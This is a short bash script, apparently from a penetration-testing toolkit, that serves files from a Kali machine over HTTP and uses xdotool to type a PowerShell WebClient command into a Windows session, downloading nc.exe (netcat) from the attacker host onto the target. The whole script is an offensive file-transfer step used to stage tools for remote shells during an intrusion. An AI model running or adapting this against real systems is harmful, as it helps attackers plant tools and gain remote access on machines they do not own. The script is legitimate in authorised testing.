#!/bin/bash

: '
ps: nc file to server
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server 1337 &
HTTP_PID=$!

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/nc.exe','nc.exe')"
xdotool key Return
sleep 60

kill $HTTP_PID